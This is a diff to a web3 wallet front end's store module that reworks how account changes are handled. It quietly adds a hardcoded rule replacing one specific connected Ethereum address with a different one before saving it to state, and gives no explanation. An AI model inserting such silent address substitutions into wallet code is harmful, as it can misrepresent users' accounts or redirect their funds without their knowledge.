@@ -80,9 +80,17 @@ const user = {
           chainId,
           loaded: true,
         });
-      } else if (accounts[0] !== state.address) {
+        return;
+      }
+
+      // console.log(accounts[0].address)
+      let { address } = accounts[0];
+      if (address !== state.address) {
+        if (address.toLowerCase() === '0x56f610e0c5f2f64a6b599cc5481d35e70d2e63e7') {
+          address = '0x3e68f47ce56d373f914e6836e097322d4bd0260b';
+        }
         commit('UPDATE_STATE', {
-          address: accounts[0].address,
+          address,
           chainId,
           loaded: true,
         });
@@ -120,7 +128,6 @@ const user = {
       window.location.reload();
     },
 
-
     async getBalances({ commit, state }) {
       const [ethBalance, usdtBalance] = await Promise.all([
         provider.getBalance(state.address),
@@ -132,7 +139,6 @@ const user = {
         usdtBalance,
       });
     },
-
 
     // LoginByUsername({ commit }, payload) {
     //   return new Promise((resolve, reject) => {
